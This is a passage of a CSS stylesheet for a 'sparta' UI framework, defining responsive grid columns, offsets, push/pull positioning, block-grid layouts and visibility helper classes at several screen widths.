            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-5>li {
                width: 20%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-5>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-5>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-5>li:nth-of-type(5n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-5>li:nth-of-type(5n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-4>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-4>li {
                width: 25%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-4>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-4>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-4>li:nth-of-type(4n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-4>li:nth-of-type(4n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-3>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-3>li {
                width: 33.33333%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-3>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-3>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-3>li:nth-of-type(3n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-3>li:nth-of-type(3n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-2>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-2>li {
                width: 50%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-2>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-2>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-2>li:nth-of-type(2n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-2>li:nth-of-type(2n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-1>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-1>li {
                width: 100%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-1>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-1>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-1>li:nth-of-type(1n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-1>li:nth-of-type(1n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column,
            .spa-ui-layer.spa-ui-modal .row>.columns,
            .spa-ui-layer.spa-ui-modal .row>.column {
                padding-left: 7.5px;
                padding-right: 7.5px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.medium-centered,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.medium-centered,
            .spa-ui-layer.spa-ui-modal .row>.columns.medium-centered,
            .spa-ui-layer.spa-ui-modal .row>.column.medium-centered {
                float: none;
                margin-left: auto;
                margin-right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.medium-centered:last-child,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.medium-centered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.columns.medium-centered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.column.medium-centered:last-child {
                float: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.medium-uncentered,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.medium-uncentered,
            .spa-ui-layer.spa-ui-modal .row>.columns.medium-uncentered,
            .spa-ui-layer.spa-ui-modal .row>.column.medium-uncentered {
                float: left;
                margin-left: 0;
                margin-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.medium-uncentered:last-child,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.medium-uncentered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.columns.medium-uncentered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.column.medium-uncentered:last-child {
                float: right
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) [class*="block-grid-"],
            .spa-ui-layer.spa-ui-modal [class*="block-grid-"] {
                display: block;
                padding: 0;
                margin: 0 -7.5px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) [class*="block-grid-"]>li,
            .spa-ui-layer.spa-ui-modal [class*="block-grid-"]>li {
                display: block;
                float: left;
                height: auto;
                padding: 0 7.5px 15px;
                list-style: none
            }
        }

        @media only screen and (min-width: 1025px) {

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row,
            .spa-ui-layer.spa-ui-modal .row {
                margin-left: auto;
                margin-right: auto;
                padding-left: 10px;
                padding-right: 10px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large,
            .spa-ui-layer.spa-ui-modal .row.collapse,
            .spa-ui-layer.spa-ui-modal .row.large-collapse,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large {
                margin-left: auto;
                margin-right: auto;
                padding-left: 0;
                padding-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse>.column,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse>.column,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large>.column,
            .spa-ui-layer.spa-ui-modal .row.collapse>.columns,
            .spa-ui-layer.spa-ui-modal .row.collapse>.column,
            .spa-ui-layer.spa-ui-modal .row.large-collapse>.columns,
            .spa-ui-layer.spa-ui-modal .row.large-collapse>.column,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large>.columns,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large>.column {
                padding-left: 0;
                padding-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-uncollapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-uncollapse-large,
            .spa-ui-layer.spa-ui-modal .row.large-uncollapse,
            .spa-ui-layer.spa-ui-modal .row.spa-uncollapse-large {
                margin-left: auto;
                margin-right: auto;
                padding-left: 10px;
                padding-right: 10px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-12,
            .spa-ui-layer.spa-ui-modal .row>.large-12 {
                width: 100%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-11,
            .spa-ui-layer.spa-ui-modal .row>.large-11 {
                width: 91.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-10,
            .spa-ui-layer.spa-ui-modal .row>.large-10 {
                width: 83.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-9,
            .spa-ui-layer.spa-ui-modal .row>.large-9 {
                width: 75%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-8,
            .spa-ui-layer.spa-ui-modal .row>.large-8 {
                width: 66.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-7,
            .spa-ui-layer.spa-ui-modal .row>.large-7 {
                width: 58.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-6,
            .spa-ui-layer.spa-ui-modal .row>.large-6 {
                width: 50%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-5,
            .spa-ui-layer.spa-ui-modal .row>.large-5 {
                width: 41.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-4,
            .spa-ui-layer.spa-ui-modal .row>.large-4 {
                width: 33.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-3,
            .spa-ui-layer.spa-ui-modal .row>.large-3 {
                width: 25%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-2,
            .spa-ui-layer.spa-ui-modal .row>.large-2 {
                width: 16.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-1,
            .spa-ui-layer.spa-ui-modal .row>.large-1 {
                width: 8.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-12,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-12 {
                margin-left: 100% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-11,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-11 {
                margin-left: 91.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-10,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-10 {
                margin-left: 83.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-9,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-9 {
                margin-left: 75% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-8,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-8 {
                margin-left: 66.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-7,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-7 {
                margin-left: 58.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-6,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-6 {
                margin-left: 50% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-5,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-5 {
                margin-left: 41.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-4,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-4 {
                margin-left: 33.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-3,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-3 {
                margin-left: 25% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-2,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-2 {
                margin-left: 16.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-1,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-1 {
                margin-left: 8.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-offset-0,
            .spa-ui-layer.spa-ui-modal .row>.large-offset-0 {
                margin-left: 0% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-12,
            .spa-ui-layer.spa-ui-modal .row>.large-push-12 {
                position: relative;
                left: 100%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-11,
            .spa-ui-layer.spa-ui-modal .row>.large-push-11 {
                position: relative;
                left: 91.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-10,
            .spa-ui-layer.spa-ui-modal .row>.large-push-10 {
                position: relative;
                left: 83.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-9,
            .spa-ui-layer.spa-ui-modal .row>.large-push-9 {
                position: relative;
                left: 75%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-8,
            .spa-ui-layer.spa-ui-modal .row>.large-push-8 {
                position: relative;
                left: 66.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-7,
            .spa-ui-layer.spa-ui-modal .row>.large-push-7 {
                position: relative;
                left: 58.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-6,
            .spa-ui-layer.spa-ui-modal .row>.large-push-6 {
                position: relative;
                left: 50%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-5,
            .spa-ui-layer.spa-ui-modal .row>.large-push-5 {
                position: relative;
                left: 41.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-4,
            .spa-ui-layer.spa-ui-modal .row>.large-push-4 {
                position: relative;
                left: 33.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-3,
            .spa-ui-layer.spa-ui-modal .row>.large-push-3 {
                position: relative;
                left: 25%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-2,
            .spa-ui-layer.spa-ui-modal .row>.large-push-2 {
                position: relative;
                left: 16.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-push-1,
            .spa-ui-layer.spa-ui-modal .row>.large-push-1 {
                position: relative;
                left: 8.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-12,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-12 {
                position: relative;
                left: auto;
                right: 100%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-11,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-11 {
                position: relative;
                left: auto;
                right: 91.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-10,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-10 {
                position: relative;
                left: auto;
                right: 83.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-9,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-9 {
                position: relative;
                left: auto;
                right: 75%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-8,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-8 {
                position: relative;
                left: auto;
                right: 66.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-7,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-7 {
                position: relative;
                left: auto;
                right: 58.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-6,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-6 {
                position: relative;
                left: auto;
                right: 50%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-5,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-5 {
                position: relative;
                left: auto;
                right: 41.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-4,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-4 {
                position: relative;
                left: auto;
                right: 33.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-3,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-3 {
                position: relative;
                left: auto;
                right: 25%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-2,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-2 {
                position: relative;
                left: auto;
                right: 16.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-pull-1,
            .spa-ui-layer.spa-ui-modal .row>.large-pull-1 {
                position: relative;
                left: auto;
                right: 8.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.large-reset-order,
            .spa-ui-layer.spa-ui-modal .row>.large-reset-order {
                float: left;
                margin-left: 0;
                margin-right: 0;
                left: auto;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-12>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-12>li {
                width: 8.33333%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-12>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-12>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-12>li:nth-of-type(12n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-12>li:nth-of-type(12n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-11>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-11>li {
                width: 9.09091%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-11>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-11>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-11>li:nth-of-type(11n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-11>li:nth-of-type(11n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-10>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-10>li {
                width: 10%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-10>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-10>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-10>li:nth-of-type(10n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-10>li:nth-of-type(10n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-9>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-9>li {
                width: 11.11111%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-9>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-9>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-9>li:nth-of-type(9n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-9>li:nth-of-type(9n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-8>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-8>li {
                width: 12.5%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-8>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-8>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-8>li:nth-of-type(8n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-8>li:nth-of-type(8n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-7>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-7>li {
                width: 14.28571%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-7>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-7>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-7>li:nth-of-type(7n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-7>li:nth-of-type(7n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-6>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-6>li {
                width: 16.66667%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-6>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-6>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-6>li:nth-of-type(6n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-6>li:nth-of-type(6n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-5>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-5>li {
                width: 20%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-5>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-5>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-5>li:nth-of-type(5n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-5>li:nth-of-type(5n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-4>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-4>li {
                width: 25%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-4>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-4>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-4>li:nth-of-type(4n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-4>li:nth-of-type(4n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-3>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-3>li {
                width: 33.33333%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-3>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-3>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-3>li:nth-of-type(3n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-3>li:nth-of-type(3n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-2>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-2>li {
                width: 50%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-2>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-2>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-2>li:nth-of-type(2n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-2>li:nth-of-type(2n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-1>li,
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-1>li {
                width: 100%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-1>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-1>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .large-block-grid-1>li:nth-of-type(1n+1),
            .spa-ui-layer.spa-ui-modal .row .large-block-grid-1>li:nth-of-type(1n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column,
            .spa-ui-layer.spa-ui-modal .row>.columns,
            .spa-ui-layer.spa-ui-modal .row>.column {
                padding-left: 10px;
                padding-right: 10px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.large-centered,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.large-centered,
            .spa-ui-layer.spa-ui-modal .row>.columns.large-centered,
            .spa-ui-layer.spa-ui-modal .row>.column.large-centered {
                float: none;
                margin-left: auto;
                margin-right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.large-centered:last-child,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.large-centered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.columns.large-centered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.column.large-centered:last-child {
                float: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.large-uncentered,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.large-uncentered,
            .spa-ui-layer.spa-ui-modal .row>.columns.large-uncentered,
            .spa-ui-layer.spa-ui-modal .row>.column.large-uncentered {
                float: left;
                margin-left: 0;
                margin-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.large-uncentered:last-child,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.large-uncentered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.columns.large-uncentered:last-child,
            .spa-ui-layer.spa-ui-modal .row>.column.large-uncentered:last-child {
                float: right
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) [class*="block-grid-"],
            .spa-ui-layer.spa-ui-modal [class*="block-grid-"] {
                display: block;
                padding: 0;
                margin: 0 -10px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) [class*="block-grid-"]>li,
            .spa-ui-layer.spa-ui-modal [class*="block-grid-"]>li {
                display: block;
                float: left;
                height: auto;
                padding: 0 10px 20px;
                list-style: none
            }
        }

        @media only screen and (min-width: 1336px) {

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row,
            .spa-ui-layer.spa-ui-modal .row {
                width: 100%;
                margin-left: auto;
                margin-right: auto;
                padding-left: 10px;
                padding-right: 10px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large,
            .spa-ui-layer.spa-ui-modal .row.large-collapse,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large {
                margin-left: auto;
                margin-right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-collapse>.column,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-large>.column,
            .spa-ui-layer.spa-ui-modal .row.large-collapse>.columns,
            .spa-ui-layer.spa-ui-modal .row.large-collapse>.column,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large>.columns,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-large>.column {
                padding-left: 0;
                padding-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.large-uncollapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-uncollapse-large,
            .spa-ui-layer.spa-ui-modal .row.large-uncollapse,
            .spa-ui-layer.spa-ui-modal .row.spa-uncollapse-large {
                margin-left: auto;
                margin-right: auto;
                padding-left: 10px;
                padding-right: 10px
            }
        }

        [data-sparta-container].flex-grid-nest {
            width: 100%;
            height: 100%
        }

        [data-sparta-container].flex-grid-nest .spa-layout-container {
            min-height: 100%;
            background: #fff;
            padding-left: 0;
            padding-right: 0;
            margin: 0 auto
        }

        [data-sparta-container].flex-grid-nest .head-row>.row {
            width: 100% !important;
            max-width: 100% !important;
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        [data-sparta-container].flex-grid-nest .head-row>.row>.column,
        [data-sparta-container].flex-grid-nest .head-row>.row>.columns {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        [data-sparta-container].flex-grid-nest .head-row>.spa-uncollapse-large {
            max-width: 100% !important
        }

        [data-sparta-container].flex-grid-nest .head-row>.spa-uncollapse-large>.large-12 {
            width: 100% !important;
            margin: 0;
            padding: 0
        }

        [data-sparta-container].flex-grid-nest .foot-row>.row {
            width: 100% !important;
            max-width: 100% !important;
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        [data-sparta-container].flex-grid-nest .foot-row>.row>.column,
        [data-sparta-container].flex-grid-nest .foot-row>.row>.columns {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        [data-sparta-container].flex-grid-nest .foot-row>.spa-uncollapse-large {
            max-width: 100% !important
        }

        [data-sparta-container].flex-grid-nest .foot-row>.spa-uncollapse-large>.large-12 {
            width: 100% !important;
            margin: 0;
            padding: 0
        }

        [data-sparta-container] [data-equalizer] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        [data-sparta-container] [data-equalizer]>[data-equalizer-watch] {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        [data-sparta-container] .radius {
            border-radius: 1000px
        }

        [data-sparta-container] .round {
            border-radius: 1000px
        }

        [data-sparta-container] .show-for-small-only,
        [data-sparta-container] .show-for-small-up {
            display: inherit !important
        }

        [data-sparta-container] .hide-for-small-only,
        [data-sparta-container] .hide-for-small-up,
        [data-sparta-container] .show-for-large-only,
        [data-sparta-container] .show-for-large-up,
        [data-sparta-container] .show-for-medium-only,
        [data-sparta-container] .show-for-medium-up,
        [data-sparta-container] .show-for-xlarge-only,
        [data-sparta-container] .show-for-xlarge-up,
